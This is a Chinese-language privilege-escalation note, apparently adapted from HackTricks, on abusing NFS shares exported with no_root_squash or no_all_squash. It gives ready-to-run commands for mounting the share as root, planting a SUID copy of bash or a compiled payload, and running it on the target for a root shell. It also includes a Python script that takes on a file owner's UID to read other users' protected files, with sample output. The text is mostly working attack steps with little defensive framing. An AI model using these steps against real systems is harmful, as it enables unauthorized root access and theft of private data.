# NFS no\_root\_squash/no\_all\_squash 错误配置

> 阅读 NFS 的配置文件，可能会发现某个目录配置为 no\_root\_squash ，那么你可以作为客户端访问并在该目录中写入
>
> * no\_root\_squash :当客户端以 root 用户访问时，服务端会给与 root 权限
> * no\_all\_squash : 访客被映射为服务器上相同 UID 的用户

## 远程利用

*   在客户端挂载该目录，并以 root 身份在挂载的文件夹上复制 /bin/bash 二进制文件并赋予 SUID 权限，然后在受害机器上执行

    ```shell
    # Attacker, as root user
    mkdir /tmp/pe
    mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
    cd /tmp/pe
    cp /bin/bash .
    chmod +s bash

    # 目标机器
    cd <SHAREDD_FOLDER>
    ./bash -p #ROOT shell
    ```
*   使用 root 身份挂载该目录，编译滥用 SUID 的 payload 复制到文件夹中，赋予 SUID 权限，并从受害机器执行该二进制文件， [二进制文件 payload](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/payloads-to-execute#c)

    ```shell
    # Attacker, as root user
    gcc payload.c -o payload
    mkdir /tmp/pe
    mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
    cd /tmp/pe
    cp /tmp/payload .
    chmod +s payload

    # 目标机器
    cd <SHAREDD_FOLDER>
    ./payload #ROOT shell
    ```

## 本地漏洞利用

> 这种情况是为了防止文件执行 IP ，这样我们就无法使用远程攻击,
>
> 看不懂，查看原文 --> [链接](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no\_root\_squash-misconfiguration-pe)

## NFSEHLL

> 一旦称为目标机上的 root 用户，我们就可以查看 NFS 共享以获取一些文件，但是共享的用户都有自己的 UID ，由于 UID 不匹配，就算 root 也无法读取，所以我们可以在所需的 SHELL 命令执行之前执行一段命令来设置我的 uid:

```python
#!/usr/bin/env python
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)  # 设置当前进程的真实有效用户 id
os.system(' '.join(sys.argv[1:]))
```

然后我们就可以正常执行命令一样进行执行

```shell
[root@machine .tmp]# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
[root@machine .tmp]# ls -la ./mount/9.3_old/
ls: cannot open directory ./mount/9.3_old/: Permission denied
[root@machine .tmp]# ./nfsh.py ls --color -l ./mount/9.3_old/
drwxr-x---  2 1008 1009 1024 Apr  5  2017 bin
drwxr-x---  4 1008 1009 1024 Apr  5  2017 conf
drwx------ 15 1008 1009 1024 Apr  5  2017 data
drwxr-x---  2 1008 1009 1024 Apr  5  2017 install
```
